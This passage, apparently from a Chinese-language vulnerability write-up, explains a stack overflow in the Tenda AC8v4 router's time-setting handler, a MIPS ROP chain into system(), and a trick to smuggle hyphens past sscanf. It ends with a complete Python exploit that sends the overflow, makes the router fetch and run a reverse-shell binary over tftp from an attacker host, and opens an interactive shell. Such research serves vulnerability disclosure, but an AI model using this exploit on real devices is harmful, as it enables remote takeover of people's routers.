由于某种神秘原因，system() 似乎也接受 $s4-s6 作为参数，其中 $s4-$s5 被设置为 t9_EQ_s4_JR_1C_p_18 的协同变量（move $t9, $s4），而 $s6 被设置为 gadget1 的协同变量，如 stack-based 偏移量 0x38+var_s18($sp) 指定的那样。这使我们能够通过 system() 执行一个 8字节 的命令。尽管如此，考虑到 $a0 在 gadget3 中设置为 a0_EQ_sp24_c_JR_24sp，偏移量为 sp_offset + 0x60 + 0x38 + 0x24 + 0xC - 0x7，我们可以执行任意长度的命令！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yGKTU8En1lUTWmh7rj1ico6Azhcw0fjHmnYhH6ZIOts7kgkibcWA4x0EIXfNyibHreZPjR1sy3sZtGVA/640?wx_fmt=png&from=appmsg "")  
  
image-20240613003719340  
## 后果：无 Wget 和无连字符  
  
此时，在 Tenda Ac8v4 路由器上执行任意命令对我们来说是轻而易举的。然而，如果你曾登录过为该路由器文件系统创建的 QEMU VM，你会发现几乎没有什么可以运行的，甚至 scp 和 wget 在 busybox 中都不存在。那么，我们如何创建一个反向 shell 以连接回我们的机器呢？答案仍然隐藏在 busybox 中：  
```
当前定义的函数：
    [[, adduser, arp, ash, awk, brctl, cat, chmod, cp, date, depmod,
    dev, echo, egrep, env, expr, false, fgrep, free, grep, halt,
    ifconfig, init, insmod, kill, killall, linuxrc, ln, login, ls, lsmod,
    mdev, mkdir, mknod, modprobmount, mv, netstat, passwd, ping, ping6,
    poweroff, ps, pwd, reboorm, rmdir, rmmod, route, sed, sh, sleep,
    sulogin, sync, tar, telnetd, test, tftp, top, touch, traceroute,
    traceroute6, true, umount, uptime, usleep, vconfig, vi, yes

```  
  
在所有这些有趣的功能中，只有一个引起了我的注意：tftp；（这很讽刺，因为路由器本身与互联网通信的唯一方式是通过 tftp 或 telnetd 和 ping）使用 tftp，我们想到构建一个反向 shell 连接恶意软件，并将其托管在我们的 tftp 上；然后通过路由器的 tftp 二进制文件获取它；进一步地，我们可以 chmod +x 和 ./RUNIT，创建一个反向 shell！这真是太有趣了！通过在远程托管 tftp 服务器，使用：sudo apt-get install xinetd tftpd tftp 并在 /etc/xinetd.d/tftp 中指定 server_arg，你可以按照这个 教程 操作。  
  
这种方法看起来非常有前途，但在尝试获取我们编写的恶意软件时，你会发现一些非常奇怪的情况；当我们将命令 $(tftp -g -r rs 192.168.31.101 && chmod +x rs && ./rs 192.168.31.101 9000) 传递给 c3 时，./bin/httpd 的后台会持续报错 unfinished ()；这为什么会这样？好吧，回顾一下我们的代码，你可能会理解：  
```
int __fastcall sub_4A79EC(int a1)
{
  ....
  s = (char *)websGetVar(a1, "time", &unk_4F09E0);
  sscanf(s, "%[^-]-%[^-]-%[^ ] %[^:]:%[^:]:%s", v6, v8, v10, v12, v14, v16);
  v18.tm_year = atoi((const char *)v6) - 0x76C;
  v18.tm_mon = atoi((const char *)v8) - 1;
  ....
}

```  
  
如你所记得，sub_4A79EC 逻辑会导致 stack-based overflow 是因为它扫描 s -> (char *)websGetVar(a1, "time", &unk_4F09E0); 到 v6, v8, v10, v12, v14, v16 时没有边界限制。这允许我们构造一个 payload：time=retr0:xxxxx<overflowing_character>xxxxx 来造成 overflow。回顾一下我们描述的 sscanf 在 regex 中的工作方式，  
> 这里的 sscanf 使用正则表达式 %[^-]-%[^-]-%[^ ] %[^:]:%[^:]:%s 过滤输入；将数据提取到 v6 或 v9 或 v10 或... 作为 data1:data2:data2 或 data1-data2-data3；因为这些变量位于栈上，甚至更危险。  
  
  
sscanf 使用 : 或 - 作为分隔符提取我们的数据；包括 tftp -g -r rs 的连字符 -g 也会被包含在内！这将导致 sscanf 将原始输出截断到 v6, v8, v10，因此只有前缀直到 - 会被保留并执行！这导致 () 的未完成。命令执行失败。那么，我们如何解决连字符问题？  
  
这里我用了一个非常有趣的解决方案：由于 bash 允许保存命令的输出并切片，类似于 Python 的 [::]，我们可以尝试从命令输出中获取 - 并将切片后的 - 保存为一个环境变量，然后在我们的 payload 中用保存的字符环境变量替换所有 -！例如，如果你在 busybox 中运行 tftp 命令，它会输出：  
```
BusyBox v1.19.2 (2022-12-20 11:55:28 CST) multi-call binary.

用法： tftp [OPTIONS] HOST [PORT]

从/到 tftp 服务器传输文件

    -l FILE    本地文件
    -r FILE    远程文件
    -g    获取文件
    -p    放置文件
    -b SIZE    传输大小为 SIZE 的数据块

```  
  
现在，如果我们通过 output=$(tftp 2>&1) 保存输出，然后计算 -l 的 - 的位置（即 47），然后将字符保存到另一个变量 spec 中；现在每当我们需要使用字符 - 时，我们可以简单地在命令前添加前缀 output=$(tftp 2>&1);spec=${output:47:1}; 并替换所有 -，这将不会触发 sscanf 的截断，从而允许我们指定参数以便通过 $(tftp -g -r rs 192.168.31.101 && chmod +x rs && ./rs 192.168.31.101 9000) 获取和执行文件！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yGKTU8En1lUTWmh7rj1ico6ANvcQGvnjvduBWEm5a6ibB9Tr2mfBwFusk9sua2D6yDaAAQVPugrEamQ/640?wx_fmt=png&from=appmsg "")  
  
image-20240613011930050  
  
现在我们完全控制了路由器:)  
### exploit.py  
```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#File: exploit.py
#Author: Patrick Peng (retr0reg)



import requests
import argparse
import threading
from pwn import log, context, flat, listen
from typing import NamedTuple

session = requests.Session()
session.trust_env = False

def ap():    
    parser = argparse.ArgumentParser()
    parser.add_argument("host",type=str,
                    help="exploiting ip")
    parser.add_argument("port",type=int,
                    help="exploiting port")
    parser.add_argument(
        "attacker_host",
        help="attacker host"
    )
    args = parser.parse_args()
    return ['',f'tftp -g -r rs {args.attacker_host} && chmod +x rs && ./rs {args.attacker_host} 9000'], args.host, args.port


class RopCmd(NamedTuple):
    second: str


def pwn(        ropcmd: RopCmd,        host: str = '192.168.31.106',        port: int = 80,    ):

    listener = listen(9000)
    context(arch = 'mips',endian = 'little',os = 'linux')

    def sink(        payload    ):    
        url = f"http://{host}:{port}/goform/SetSysTimeCfg"
        _payload = b''
        _payload = b'retr0reg' + b":" + payload
        data = {
            b"timeType":b"manual",
            b"time":_payload
        }

        def send_request():
            try:
                requests.post(url=url, data=data)
            except Exception as e:
                print(f"Request failed: {e}")

        thread = threading.Thread(target=send_request)
        thread.start()

    def _rop(ropcmd: RopCmd):

        # rop-chain:
        # lw $s4 0x48; jr 0x5c
        # move $t9,$s4; jr 0x34($sp)
        # addiu $a0,$sp,0x28+var_C | jr 0x24($sp)
        # 

        # 77f59000-77fe5000 r-xp 00000000 08:01 788000 
        libc_base       = 0x77f59000        
        _system         = 0x004E630

        t9_target       = 0x77fa7630
        ret_offset      = 0x7b #  -> b'bgaa'
        sp_offset       = 0x7f # --> b'bhaa'

        sp2             = 0x60  # LOAD:0007EB7C 
        sp3             = 0x38  # LOAD:0001B038 

        print('\n')

        log.success("Exploit started!")
        log.info(f"retaddr offset: {hex(ret_offset)}")
        log.info(f"$sp offset: {hex(sp_offset)}")
        log.info(f"libc_base -> {hex(libc_base)}")

        lw_s4_0x48_JR_5Csp    = 0x0007E8C8 # lw $s4,0x38+var_s10($sp) | jr 0x5C($sp)
        # LOAD:0007E8CC                 move    $v0, $s0
        # LOAD:0007E8D0                 lw      $fp, 0x38+var_s20($sp)
        # LOAD:0007E8D4                 lw      $s7, 0x38+var_s1C($sp)
        # LOAD:0007E8D8                 lw      $s6, 0x38+var_s18($sp)
        # LOAD:0007E8DC                 lw      $s5, 0x38+var_s14($sp)
        # LOAD:0007E8E0                 lw      $s4, 0x38+var_s10($sp)
        # LOAD:0007E8E4                 lw      $s3, 0x38+var_sC($sp)
        # LOAD:0007E8E8                 lw      $s2, 0x38+var_s8($sp)
        # LOAD:0007E8EC                 lw      $s1, 0x38+var_s4($sp)
        # LOAD:0007E8F0                 lw      $s0, 0x38+var_s0($sp)
        # LOAD:0007E8F4                 jr      $ra
        # LOAD:0007E8F8                 addiu   $sp, 0x60

        t9_EQ_s4_JR_1C_p_18   = 0x0001B014 # move $t9,$s4             | jr 0x1C+0x18($sp)
        # LOAD:0001B018                 lw      $ra, 0x1C+var_s18($sp)
        # LOAD:0001B01C                 lw      $s5, 0x1C+var_s14($sp)
        # LOAD:0001B020                 lw      $s4, 0x1C+var_s10($sp)
        # LOAD:0001B024                 lw      $s3, 0x1C+var_sC($sp)
        # LOAD:0001B028                 lw      $s2, 0x1C+var_s8($sp)
        # LOAD:0001B02C                 lw      $s1, 0x1C+var_s4($sp)
        # LOAD:0001B030                 lw      $s0, 0x1C+var_s0($sp)
        # LOAD:0001B034                 jr      $ra
        # LOAD:0001B038                 addiu   $sp, 0x38

        a0_EQ_sp24_c_JR_24sp  = 0x0004D144 # addiu $a0,$sp,0x24+var_C | jr 0x24($sp)
        # LOAD:0004D144                 addiu   $a0, $sp, 0x24+var_C
        # LOAD:0004D148                 lw      $ra, 0x24+var_s0($sp)
        # LOAD:0004D14C                 nop
        # LOAD:0004D150                 jr      $ra


        a0_EQ_sp28_c_JR_24sp  = 0x00058920 # addiu $a0,$sp,0x28+var_C | jr 0x24($sp)
        # LOAD:00058920                 addiu   $a0, $sp, 0x28+var_C
        # LOAD:00058924                 lw      $v1, 0x28+var_C($sp)
        # LOAD:00058928                 lw      $ra, 0x28+var_4($sp)
        # LOAD:0005892C                 sw      $v1, 0($s0)
        # LOAD:00058930                 lw      $s0, 0x28+var_8($sp)
        # LOAD:00058934                 jr      $ra

        print('')
        log.success("Ropping....")
        log.info(f"gadget lw_s4_0x48_JR_5Csp   -> {hex(libc_base + lw_s4_0x48_JR_5Csp)}")
        log.info(f"gadget t9_EQ_s4_JR_1C_p_18  -> {hex(libc_base + t9_EQ_s4_JR_1C_p_18)}")
        log.info(f"gadget a0_EQ_sp24_c_JR_24sp -> {hex(libc_base + a0_EQ_sp24_c_JR_24sp)}")
        log.info(f"_system                     -> {hex(libc_base + _system)}")

        c1 = ""
        c2 = ""

        c3 = "output=$(tftp 2>&1);spec=${output:47:1};" + ropcmd[1].replace('-','$(echo $spec)')

        log.info(f"Inject $a0: {c3}")

        _payload = {
                ret_offset: libc_base + lw_s4_0x48_JR_5Csp, # flow1
                (sp_offset + 0x48): t9_target,
                (sp_offset + 0x38 + 0x18): f'{c2}'.encode(), # $s6, 0x38+var_s18($sp)
                (sp_offset + 0x5c): libc_base + t9_EQ_s4_JR_1C_p_18, # flow2
                (sp_offset + sp2 + 0x1C + 0x10): f'{c1}'.encode(), # flow2 $s4-$s5 (caller), this is set via previous control-ed registers
                (sp_offset + sp2 + 0x34): libc_base + a0_EQ_sp24_c_JR_24sp, 
                (sp_offset + sp2 + sp3 + 0x24): libc_base + _system, # flow3
                (sp_offset + sp2 + sp3 + 0x24 + 0xC - 0x7): f'$({c3});'.encode()
            }

        print('')
        log.success("Stack looks like:")
        for key, value in _payload.items():
            try:
                log.info(f"offset: {hex(key)} : {hex(value)}")
            except TypeError:
                pass

        # $sp growth  -> +0x60 -> 0x38 
        #
        # | retaddr             | lw_s4_0x48_JR_5Csp   |  i. (gadget address) 
        # | (current sp)        |                      |     ($spsz1=0d127)
        # | $sp1+0x48           | t9_target            |  i ->  $s4  
        # | $sp2+0x5c           | t9_EQ_s4_JR_1C_p_18  |  ii <- $t9 ($spsz2+=0x60)
        # | $sp1+$sp2+$sp3-0xC  | command              |  <- $a0
        # | $sp1+$sp2+0x34      | a0_EQ_sp24_c_JR_24sp |  iii. ($spsz3+=38)
        # | $sp1+$sp2+$sp3+0x24 | _system              |  <- jmp

        return flat(_payload)

    payload = _rop(ropcmd)
    sink(payload=payload)

    print('')
    listener.wait_for_connection()
    log.critical("Recieved shell!")
    listener.interactive()

if __name__ == "__main__":
    ropcmd, host, port = ap()
    log.info("0reg.dev - retr0reg")
    log.info("Tenda AC8v4 stack-based overflow")
    print('')
    print(
        """\        __________        __          _______                                \______   \ _____/  |________ \   _  \_______   ____   ____          |       _// __ \   __\_  __ \/  /_\  \_  __ \_/ __ \ / ___\         |    |   \  ___/|  |  |  | \/\  \_/   \  | \/\  ___// /_/  >        |____|_  /\___  >__|  |__|    \_____  /__|    \___  >___  /                 \/     \/                    \/            \/_____/          """
    )
    log.info("RCE via Mipsel ROP")
    pwn(ropcmd, host, port)

```  
  
  
  
